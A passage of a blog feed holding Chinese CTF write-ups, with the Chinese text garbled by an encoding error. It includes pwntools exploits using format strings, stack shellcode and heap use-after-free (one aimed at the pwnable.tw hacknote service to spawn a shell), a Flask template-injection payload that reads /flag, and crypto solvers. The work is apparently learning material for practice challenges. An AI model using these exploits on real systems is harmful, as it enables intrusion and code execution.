¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h2><h3 id="fmtstr1"><a href="#fmtstr1" class="headerlink" title="fmtstr1"></a>fmtstr1</h3><p>è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„</p><p>æ€è·¯ï¼šå°†xçš„åœ°å€æ”¾åˆ°æ ˆä¸Šï¼Œå¯¹åº”çš„è·å–æ ˆä¸Šçš„åœ°å€ç›¸å¯¹äº<code>printf</code>çš„ç¬¬å‡ ä¸ªå‚æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">conn=process(<span class="string">'./fmtstr1'</span>)</span><br><span class="line">e=ELF(<span class="string">'./fmtstr1'</span>)</span><br><span class="line">x_addr=<span class="number">0x0804A02C</span>                                      </span><br><span class="line">payload=p32(x_addr) + <span class="string">b"%11$n"</span></span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h3 id="fmstr2"><a href="#fmstr2" class="headerlink" title="fmstr2"></a>fmstr2</h3><p>è¿™é¢˜å¾ˆå¥‡æ€ª X64  æ„Ÿè§‰æ˜¯çˆ†ç ´å‡ºæ¥çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%9$s</span><br></pre></td></tr></table></figure><h3 id="fmstr-uaf"><a href="#fmstr-uaf" class="headerlink" title="fmstr_uaf"></a>fmstr_uaf</h3><p>RWXæ‰“å¼€ï¼Œè¯´æ˜åº”è¯¥æ˜¯è¿”å›shellcode</p><p>ä¹Ÿå°±æ˜¯æ ˆä¸Šå†™shellcode</p><p>æ­¤å¤–ï¼Œè¿˜éœ€è¦åˆ©ç”¨å †è¿›è¡ŒUAF</p><p>è¿›è¡Œshellcodeçš„è°ƒç”¨</p><p>åŒæ—¶è¿˜æœ‰fmstræ³„éœ²mainâ€™rbpçš„ä½ç½®</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122165900691.png" alt="image-20201122165900691"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./echo2"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./echo2"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"hey, what's your name? : "</span>)</span><br><span class="line">shellcode=<span class="string">b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">b"2"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b"%10$p"</span>+<span class="string">b"A"</span>*<span class="number">3</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b"0x"</span>)</span><br><span class="line">shellcode_addr=int(p.recvuntil(<span class="string">b'AAA'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)<span class="number">-0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">b"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"to exit? (y/n)"</span>)</span><br><span class="line">p.sendline(<span class="string">b"n"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">b"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"hello \n"</span>)</span><br><span class="line">p.sendline(<span class="string">b"A"</span>*<span class="number">24</span>+p64(shellcode_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="å †-1"><a href="#å †-1" class="headerlink" title="å †"></a>å †</h2><h3 id="heap1"><a href="#heap1" class="headerlink" title="heap1"></a>heap1</h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122225712975.png" alt="image-20201122225712975"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122225952773.png" alt="image-20201122225952773"></p><p>é¦–å…ˆéœ€è¦æä¸¤ä¸ªchunk(8byte)ï¼Œfreeåï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬fastbinä¸­å°±ä¼šæœ‰ä¸¤ä¸ª8byteçš„chunk</p><p>ä¹‹åæˆ‘ä»¬åœ¨åˆ†é…1ä¸ªchunkï¼Œç”±äºfastbinçš„ç¼˜æ•…</p><p>æˆ‘ä»¬å°±ä¼šæŠŠptr[1]ä¸­çš„chunkç›´æ¥æ‹¿è¿‡æ¥</p><p>å¹¶ä¸”æˆ‘ä»¬å¯ä»¥æ§åˆ¶content sizeä¸º8 æˆ‘ä»¬ä¹Ÿå°±æŠŠptr[0]ä¸­çš„chunkæ‹¿äº†è¿‡æ¥</p><p>ä»è€Œè¾¾åˆ°äº†UAF</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122231126664.png" alt="image-20201122231126664"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122231528599.png" alt="image-20201122231528599"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(*ptr[v1])(ptr[v1]);</span><br><span class="line">int self_puts(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  return puts(*(a1 + 4));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10102</span>)</span><br><span class="line"><span class="comment">#p=process("./hacknote")</span></span><br><span class="line">elf = ELF(<span class="string">"./hacknote"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">pfputs = <span class="number">0x804862b</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size,index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">b"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">b"1"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b"size :"</span>)</span><br><span class="line">      p.sendline(size)</span><br><span class="line">      p.recvuntil(<span class="string">b"Content :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">b"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">b"2"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span><span class="params">(index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">b"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">b"3"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b"16"</span>,<span class="string">b"aaaaa"</span>)</span><br><span class="line">add_note(<span class="string">b"16"</span>,<span class="string">b"aaaaa"</span>)</span><br><span class="line">delete_note(<span class="string">b'0'</span>)</span><br><span class="line">delete_note(<span class="string">b'1'</span>)</span><br><span class="line">add_note(<span class="string">b'8'</span>,p32(pfputs)+p32(read_got))</span><br><span class="line">print_note(<span class="string">b'0'</span>)</span><br><span class="line"></span><br><span class="line">pfread = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">pfsys = pfread - <span class="number">0xd41c0</span> + <span class="number">0x3a940</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">delete_note(<span class="string">b'2'</span>)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b'8'</span>,p32(pfsys)+<span class="string">b"||sh"</span>)</span><br><span class="line">print_note(<span class="string">b'0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h1&gt;&lt;p&gt;çº¯é›¶åŸºç¡€ï¼Œå¤§ä½¬è¯·ç•¥è¿‡&lt;/p&gt;
&lt;p&gt;ä»é›¶å¼€å§‹å­¦ä¹ PWN,Webä¼šå»å­¦ï¼Œä½†å¯èƒ½ç°åœ¨å¤§éƒ¨åˆ†æ—¶é—´ä¼šç”¨åœ¨</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>CUMT2020åä¸ºæ¯</title>
    <link href="https://pz1o.top/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/"/>
    <id>https://pz1o.top/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/</id>
    <published>2020-10-24T09:53:38.000Z</published>
    <updated>2020-11-20T14:18:17.449Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="CUMTåä¸ºæ¯"><a href="#CUMTåä¸ºæ¯" class="headerlink" title="CUMTåä¸ºæ¯"></a>CUMTåä¸ºæ¯</h1><p>webç‹—æ´»æˆäº†å„æ–¹å‘ç­¾åˆ°æ‰‹â€¦</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h2><p>æ¨¡æ¿æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;name&#x3D;&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(40)(%27&#x2F;flag%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h2><p>f12æ‘‡å¥–å¾—flag</p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello_world"></a>hello_world</h2><p>å¼‚æˆ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">d=[]</span><br><span class="line">b = <span class="string">"is_easy_right?"</span></span><br><span class="line">a = [<span class="string">'2A'</span>, <span class="string">'26'</span>, <span class="string">'12'</span>, <span class="string">'31'</span>, <span class="string">'1A'</span>, <span class="string">'7'</span>, <span class="string">'11'</span>, <span class="string">'3A'</span>, <span class="string">'2D'</span>, <span class="string">'0F'</span>, <span class="string">'0E'</span>,<span class="string">'1A'</span>, <span class="string">'41'</span>, <span class="string">'4B'</span>, <span class="string">'36'</span>, <span class="string">'43'</span>, <span class="string">'31'</span>, <span class="string">'0'</span>, <span class="string">'3E'</span>, <span class="string">'16'</span>, <span class="string">'17'</span>, <span class="string">'35'</span>,<span class="string">'1D'</span>, <span class="string">'10'</span>, <span class="string">'38'</span>, <span class="string">'11'</span>, <span class="string">'44'</span>, <span class="string">'4A'</span>, <span class="string">'1B'</span>, <span class="string">'2C'</span>, <span class="string">'2B'</span>, <span class="string">'17'</span>,<span class="string">'50'</span>,<span class="string">'3'</span>, <span class="string">'4'</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> a:</span><br><span class="line">    c = <span class="string">''</span></span><br><span class="line">    z = x</span><br><span class="line">    c += <span class="string">'0x'</span></span><br><span class="line">    c +=z</span><br><span class="line">    d.append(c)</span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">35</span>):</span><br><span class="line">    c = int(a[i],<span class="number">16</span>)</span><br><span class="line">    m = i%<span class="number">14</span></span><br><span class="line">    print(chr(ord((b[m]))^c),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><h2 id="non-name"><a href="#non-name" class="headerlink" title="non_name"></a>non_name</h2><p>å››å…ƒä¸€æ¬¡æ–¹ç¨‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b = [<span class="number">12</span>, <span class="number">32</span>, <span class="number">34</span>, <span class="number">12</span>, <span class="number">53</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">34</span>, <span class="number">45</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">85</span>, <span class="number">43</span>]</span><br><span class="line">c = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">    sum1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        print(<span class="string">"%s*%s"</span>%(b[i*<span class="number">4</span>+j],c[j]),end=<span class="string">'+'</span>)</span><br><span class="line">    print(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#116 103 102 114</span></span><br></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Classical"><a href="#Classical" class="headerlink" title="Classical"></a>Classical</h2><p>ç»´å‰å°¼äºšå¯†ç ï¼Œä¸Šç½‘downè„šæœ¬ï¼ŒçŒœå¯†é’¥ï¼Œè·‘å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">"Elxyi lrw fqfjyxl pr wixx yajy chb qtsk lqfjzrx zs xuua vafe chb nfsl pcgy es ipgv tzxo ywzq rvyc djxcfx lrw oyr tzxo ytc vxhp! Orwto pmlx rvy hafm vh icitt;kz wzxtx dzy phre tg zq;uj hlta czu otpm yz fx,iinamlg rtf ltci zndr qgj wmyl eyd ggg vmlrvl xz dg tne ysi momygk rqn blrm as oo.Eta rtf ltci pngnia mltiprpsk mq ffvi rvy dwwxv,xszyzo xciseu mt xedl czu kmthsr,igvyrh khtkth xh ripp qhw azxeg,lrzuya jhup xh teve qhw afatr? Hphaql rny jsnywplx bp hysikzâ€™wsowl.Ky dzy yliw tztv by sykaw jom,bv iwzftipj hmkvl ysi halpr hxtlty, xhv.Xse ztrinpwm vj aeginx izrâ€™m uineklcknwc ahzp tzx dxxe sy lzprqmjbsr;xalc uukm otpp xal qzsl hh xapvraltny mjty nsflw llggi mmpmk dej.Hsirbspwl smps xht mmzwx dlz cjr,vatdi pos sujm, vatdi pos sanx uxfcgalh,lnv mjhxp aav llvw mtbjo,jhy sylq mjxd neg htarwvktyp xal mxpgkvtsni hm tpoheg.pmz ltci eomvjxi elxpv winxu.Etgi ulktnk pkmm l wfppp,gjhyl btxa h otsk tpw jyhl dmeh s mgtw.Elx ivtgzmgly qymbvp waen tqherz fp bslgw ty e yvvrolmgg ulwm, fsf csgâ€™v zt zr plpw if ekyjfrmpp jom egm lz sy fsfr htum klmebvps sgf ajlvmhgsek.Tpw ny xal iyd, A to zqlh mv xpld rqn ysi VBQECLY kl JynhfXseNbixspvxJmahwk.Dr ysi phc, ceexoujc xh bwp bjtexx miyvvp smuobyemgn."</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message, key)</span>:</span></span><br><span class="line">    cipher = <span class="string">''</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(message)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key[j % len(key)].islower():</span><br><span class="line">            offset = ord(key[j % len(key)]) - ord(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key[j % len(key)].isupper():</span><br><span class="line">                offset = ord(key[j % len(key)]) - ord(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                offset = ord(key[j % len(key)]) - <span class="number">48</span></span><br><span class="line"></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message[i].isalpha():</span><br><span class="line">            <span class="keyword">if</span> message[i].islower():</span><br><span class="line">                cipher += chr((ord(message[i]) - ord(<span class="string">'a'</span>) + offset) % <span class="number">26</span> + ord(<span class="string">'a'</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cipher += chr((ord(message[i]) - ord(<span class="string">'A'</span>) + offset) % <span class="number">26</span> + ord(<span class="string">'A'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher += message[i]</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    explain = <span class="string">''</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key[j % len(key)].islower():</span><br><span class="line">            offset = ord(key[j % len(key)]) - ord(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key[j % len(key)].isupper():</span><br><span class="line">                offset = ord(key[j % len(key)]) - ord(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                offset = ord(key[j % len(key)]) - <span class="number">48</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> cipher[i].isalpha():</span><br><span class="line">            <span class="keyword">if</span> cipher[i].islower():</span><br><span class="line">                explain += chr((ord(cipher[i]) - ord(<span class="string">'a'</span>) - offset) % <span class="number">26</span> + ord(<span class="string">'a'</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                explain += chr((ord(cipher[i]) - ord(<span class="string">'A'</span>) - offset) % <span class="number">26</span> + ord(<span class="string">'A'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            explain += cipher[i]</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> explain</span><br><span class="line"></span><br><span class="line">print(decrypt(cipher,<span class="string">'Lethelastctf'</span>))</span><br><span class="line"></span><br><span class="line">CUMTCTF&#123;EnjoyTheVigenereCipher&#125;</span><br></pre></td></tr></table></figure><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>å¤§æ•°e</p><p>å¯ä»¥åˆ¤æ–­æ˜¯wiener attack</p><p>ä¸Šç½‘ç›´æ¥downè„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;&#39;</span><br><span class="line">Created on Dec 14, 2011</span><br><span class="line"></span><br><span class="line">@author: pablocelayes</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"></span><br><span class="line">def hack_RSA(e,n):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    Finds d knowing (e,n)</span><br><span class="line">    applying the Wiener continued fraction attack</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    frac &#x3D; ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents &#x3D; ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    for (k,d) in convergents:</span><br><span class="line">        </span><br><span class="line">        #check if d is actually the key</span><br><span class="line">        if k!&#x3D;0 and (e*d-1)%k &#x3D;&#x3D; 0:</span><br><span class="line">            phi &#x3D; (e*d-1)&#x2F;&#x2F;k</span><br><span class="line">            s &#x3D; n - phi + 1</span><br><span class="line">            # check if the equation x^2 - s*x + n &#x3D; 0</span><br><span class="line">            # has integer roots</span><br><span class="line">            discr &#x3D; s*s - 4*n</span><br><span class="line">            if(discr&gt;&#x3D;0):</span><br><span class="line">                t &#x3D; Arithmetic.is_perfect_square(discr)</span><br><span class="line">                if t!&#x3D;-1 and (s+t)%2&#x3D;&#x3D;0:</span><br><span class="line">                    print(&quot;Hacked!&quot;)</span><br><span class="line">                    return d</span><br><span class="line"></span><br><span class="line"># TEST functions</span><br><span class="line"></span><br><span class="line">def test_hack_RSA():</span><br><span class="line">    print(&quot;Testing Wiener Attack&quot;)</span><br><span class="line">    times &#x3D; 5</span><br><span class="line">    </span><br><span class="line">    while(times&gt;0):</span><br><span class="line">        e,n,d &#x3D; RSAvulnerableKeyGenerator.generateKeys(1024)</span><br><span class="line">        print(&quot;(e,n) is (&quot;, e, &quot;, &quot;, n, &quot;)&quot;)</span><br><span class="line">        print(&quot;d &#x3D; &quot;, d)</span><br><span class="line">    </span><br><span class="line">        hacked_d &#x3D; hack_RSA(e, n)</span><br><span class="line">    </span><br><span class="line">        if d &#x3D;&#x3D; hacked_d:</span><br><span class="line">            print(&quot;Hack WORKED!&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;Hack FAILED&quot;)</span><br><span class="line">        </span><br><span class="line">        print(&quot;d &#x3D; &quot;, d, &quot;, hacked_d &#x3D; &quot;, hacked_d)</span><br><span class="line">        print(&quot;-------------------------&quot;)</span><br><span class="line">        times -&#x3D; 1</span><br><span class="line">    </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    n &#x3D; 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span><br><span class="line">    e &#x3D; 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span><br><span class="line">    c &#x3D; 235079473042454099807116076488262740135383858230967099540307826273199444131724945298259060669497025680602868465015609167157760611830665379910856647739895018654389167886359502125262006498872925841789249028759026079722290718145036644959479543255350040619949567107916725017078853648984759794085772688267388901151</span><br><span class="line">    #test_is_perfect_square()</span><br><span class="line">    d &#x3D; 8264667972294275017293339772371783322168822149471976834221082393409363691895</span><br><span class="line">    m &#x3D; pow(c,d,n)</span><br><span class="line">    def num2str(num):</span><br><span class="line">        tmp &#x3D; hex(num)[2:].replace(&quot;L&quot;,&quot;&quot;)</span><br><span class="line">        if(len(tmp))%2 &#x3D;&#x3D;0:</span><br><span class="line">            return tmp.decode(&quot;hex&quot;)</span><br><span class="line">        else:</span><br><span class="line">            return (&quot;0&quot;+tmp).decode(&quot;hex&quot;)</span><br><span class="line">    print(num2str(m))</span><br><span class="line">    #print(&quot;-------------------------&quot;)</span><br><span class="line">    #print(hack_RSA(e,n))</span><br><span class="line"></span><br><span class="line">CUMTCTF&#123;1bc205a110e6643137e045b8268b4ace&#125;</span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h2><p>è½¬base64åœ¨è½¬brainfk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 